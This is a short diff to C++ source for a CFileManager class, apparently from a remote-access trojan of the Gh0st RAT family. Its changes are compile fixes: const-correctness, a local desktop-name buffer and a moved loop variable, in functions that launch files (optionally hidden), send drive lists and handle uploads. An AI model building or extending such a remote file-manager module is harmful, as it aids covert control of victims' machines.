@@ -199,7 +199,7 @@ bool CFileManager::OpenFile(LPCTSTR lpFile, INT nShowCmd)
 	char	*lpstrCat = NULL;
 	memset(strTemp, 0, sizeof(strTemp));
 	
-	char	*lpExt = strrchr(lpFile, '.');
+	const char	*lpExt = strrchr(lpFile, '.');
 	if (!lpExt)
 		return false;
 	
@@ -231,9 +231,10 @@ bool CFileManager::OpenFile(LPCTSTR lpFile, INT nShowCmd)
 	
 	STARTUPINFO si = {0};
 	PROCESS_INFORMATION pi;
+	char local_lpDesktop[] = "WinSta0\\Default";
 	si.cb = sizeof si;
 	if (nShowCmd != SW_HIDE)
-		si.lpDesktop = "WinSta0\\Default"; 
+		si.lpDesktop = local_lpDesktop; 
 	
 	CreateProcess(NULL, strTemp, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
 }
@@ -252,8 +253,8 @@ UINT CFileManager::SendDriveList()
 	unsigned __int64	HDFreeSpace = 0;
 	unsigned long		AmntMB = 0; // 总大小
 	unsigned long		FreeMB = 0; // 剩余空间
-
-	for (DWORD dwOffset = 1; *pDrive != '\0'; pDrive += lstrlen(pDrive) + 1)
+	DWORD dwOffset = 0;
+	for (dwOffset = 1; *pDrive != '\0'; pDrive += lstrlen(pDrive) + 1)
 	{
 		memset(FileSystem, 0, sizeof(FileSystem));
 		// 得到文件系统信息及大小
@@ -540,7 +541,7 @@ bool CFileManager::FixedUploadList(LPCTSTR lpPathName)
 {
 	WIN32_FIND_DATA	wfd;
 	char	lpszFilter[MAX_PATH];
-	char	*lpszSlash = NULL;
+	const char	*lpszSlash = NULL;
 	memset(lpszFilter, 0, sizeof(lpszFilter));
 
 	if (lpPathName[lstrlen(lpPathName) - 1] != '\\')
